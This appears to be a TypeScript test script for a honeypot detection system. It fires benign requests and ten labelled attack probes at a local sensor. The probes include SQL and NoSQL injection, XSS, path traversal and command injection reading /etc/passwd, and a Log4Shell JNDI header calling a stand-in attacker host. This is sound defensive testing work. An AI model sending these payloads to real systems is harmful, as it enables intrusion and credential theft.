/**
 * VIGILANCE Nowhere Esports Intranet - Controlled Synthetic Traffic Generator
 * Exercises benign endpoints and sends synthetic attack probes against the local honeypot.
 */

interface TrafficScenario {
  name: string;
  category: 'BENIGN' | 'ATTACK';
  expectedThreat?: string;
  method: 'GET' | 'POST';
  path: string;
  headers?: Record<string, string>;
  body?: unknown;
}

const SCENARIOS: TrafficScenario[] = [
  // Benign scenarios
  {
    name: 'Benign 1: Browse Homepage',
    category: 'BENIGN',
    method: 'GET',
    path: '/',
  },
  {
    name: 'Benign 2: Search Tournaments',
    category: 'BENIGN',
    method: 'GET',
    path: '/tournaments?search=Apex+Masters',
  },
  {
    name: 'Benign 3: Staff Roster',
    category: 'BENIGN',
    method: 'GET',
    path: '/staff/directory',
  },
  {
    name: 'Benign 4: Tournament JSON API',
    category: 'BENIGN',
    method: 'GET',
    path: '/api/v1/tournaments',
  },
  {
    name: 'Benign 5: Standard Login Attempt',
    category: 'BENIGN',
    method: 'POST',
    path: '/login',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'username=esports_pro_42&password=StandardPassword2026',
  },

  // Attack scenarios across diverse categories
  {
    name: 'Attack 1: Classic SQL Injection Tautology',
    category: 'ATTACK',
    expectedThreat: 'SQL_INJECTION',
    method: 'GET',
    path: "/api/v1/tournaments?region=EU' OR '1'='1",
  },
  {
    name: 'Attack 2: Advanced SQLi UNION Exploitation',
    category: 'ATTACK',
    expectedThreat: 'SQL_INJECTION',
    method: 'GET',
    path: "/api/v1/tournaments?query=1 UNION SELECT null, username, password FROM users--",
  },
  {
    name: 'Attack 3: Cross-Site Scripting (XSS) Tag Injection',
    category: 'ATTACK',
    expectedThreat: 'CROSS_SITE_SCRIPTING',
    method: 'GET',
    path: "/tournaments?search=<script>alert(document.domain)</script>",
  },
  {
    name: 'Attack 4: Path Traversal (Directory Climbing)',
    category: 'ATTACK',
    expectedThreat: 'PATH_TRAVERSAL',
    method: 'GET',
    path: "/tournaments?file=../../../../etc/passwd",
  },
  {
    name: 'Attack 5: Command Injection Shell Metacharacter',
    category: 'ATTACK',
    expectedThreat: 'COMMAND_INJECTION',
    method: 'GET',
    path: "/api/v1/tournaments?host=127.0.0.1; cat /etc/passwd",
  },
  {
    name: 'Attack 6: Log4Shell JNDI Header Injection',
    category: 'ATTACK',
    expectedThreat: 'LOG4SHELL',
    method: 'GET',
    path: "/api/v1/staff",
    headers: { 'User-Agent': '${jndi:ldap://recon.attacker.internal/payload}' },
  },
  {
    name: 'Attack 7: Sensitive Canary File Discovery (Honeytoken)',
    category: 'ATTACK',
    expectedThreat: 'RECONNAISSANCE',
    method: 'GET',
    path: "/.env",
  },
  {
    name: 'Attack 8: Automated Vulnerability Scanner Signature',
    category: 'ATTACK',
    expectedThreat: 'SCANNER',
    method: 'GET',
    path: "/admin/login",
    headers: { 'User-Agent': 'sqlmap/1.7.2#stable (https://sqlmap.org)' },
  },
  {
    name: 'Attack 9: NoSQL Operator Injection',
    category: 'ATTACK',
    expectedThreat: 'NOSQL_INJECTION',
    method: 'POST',
    path: "/login",
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: { $gt: '' }, password: { $ne: '' } }),
  },
  {
    name: 'Attack 10: Multi-Vector Exploit with Scanner User-Agent',
    category: 'ATTACK',
    expectedThreat: 'MULTI_VECTOR (CRITICAL)',
    method: 'GET',
    path: "/.env?q=1' OR 1=1--",
    headers: { 'User-Agent': 'nikto/2.1.6 (OSVDB-3092)' },
  },
];

import { createApp } from '../src/app.js';
import { MockEvidenceRepository } from '../src/repository/mockEvidenceRepository.js';
import type { Server } from 'http';

async function runSyntheticTrafficSuite() {
  let targetHost = process.env.TARGET_HOST || 'http://127.0.0.1:3000';
  let ephemeralServer: Server | null = null;
  let mockRepo: MockEvidenceRepository | null = null;

  // Probe targetHost; if down, start an ephemeral in-process honeypot
  try {
    const probeRes = await fetch(`${targetHost}/robots.txt`, { signal: AbortSignal.timeout(500) });
    await probeRes.text();
  } catch {
    console.log(`[INFO] Honeypot at ${targetHost} is offline. Starting ephemeral honeypot instance...`);
    mockRepo = new MockEvidenceRepository();
    const app = createApp(mockRepo);
    await new Promise<void>((resolve) => {
      ephemeralServer = app.listen(0, '127.0.0.1', () => {
        const addr = ephemeralServer!.address();
        if (typeof addr === 'object' && addr !== null) {
          targetHost = `http://127.0.0.1:${addr.port}`;
        }
        resolve();
      });
    });
    console.log(`[READY] Ephemeral Honeypot active on ${targetHost}\n`);
  }

  console.log('===============================================================');
  console.log('   VIGILANCE: CONTROLLED SYNTHETIC TRAFFIC RUNNER              ');
  console.log('===============================================================');
  console.log(`[TARGET] Target Sensor: ${targetHost}`);
  console.log(`[COUNT] Total Scenarios: ${SCENARIOS.length} (5 Benign, 10 Synthetic Attacks)\n`);

  let passed = 0;
  let failed = 0;

  for (let i = 0; i < SCENARIOS.length; i++) {
    const s = SCENARIOS[i];
    const url = `${targetHost}${s.path}`;
    const startTime = performance.now();

    try {
      const options: RequestInit = {
        method: s.method,
        headers: {
          'Host': 'localhost',
          ...(s.headers || {}),
        },
      };

      if (s.method === 'POST' && s.body) {
        options.body = typeof s.body === 'string' ? s.body : JSON.stringify(s.body);
      }

      const res = await fetch(url, options);
      const elapsed = (performance.now() - startTime).toFixed(1);

      console.log(`  [${s.category}] [HTTP ${res.status}] ${s.name} (${elapsed}ms)`);
      if (s.expectedThreat) {
        console.log(`        Expected Threat Detection: ${s.expectedThreat}`);
      }
      passed++;
    } catch (err) {
      const elapsed = (performance.now() - startTime).toFixed(1);
      console.log(`  [FAIL] ${s.name} (${elapsed}ms): ${(err as Error).message}`);
      failed++;
    }
  }

  if (mockRepo) {
    const records = mockRepo.getAllRecords();
    console.log('\n---------------------------------------------------------------');
    console.log(`[AUDIT] Honeypot Evidence Persistence:`);
    console.log(`  - Total Requests Evaluated : ${SCENARIOS.length}`);
    console.log(`  - Attack Records Generated  : ${records.length}`);
    console.log(`  - Benign Requests Filtered  : ${SCENARIOS.filter(s => s.category === 'BENIGN').length}`);
    console.log(`  - Highest Threat Recorded   : ${Math.max(...records.map(r => r.detection.severity_score), 0)}/100`);
    console.log('---------------------------------------------------------------');
  }

  if (ephemeralServer) {
    await new Promise<void>((resolve) => (ephemeralServer as Server).close(() => resolve()));
    console.log('[CLEANUP] Ephemeral sensor terminated.');
  }

  console.log('\n===============================================================');
  console.log(`[SUMMARY] Completed: ${passed} succeeded, ${failed} failed.`);
  console.log('===============================================================\n');
}

runSyntheticTrafficSuite().catch(console.error);
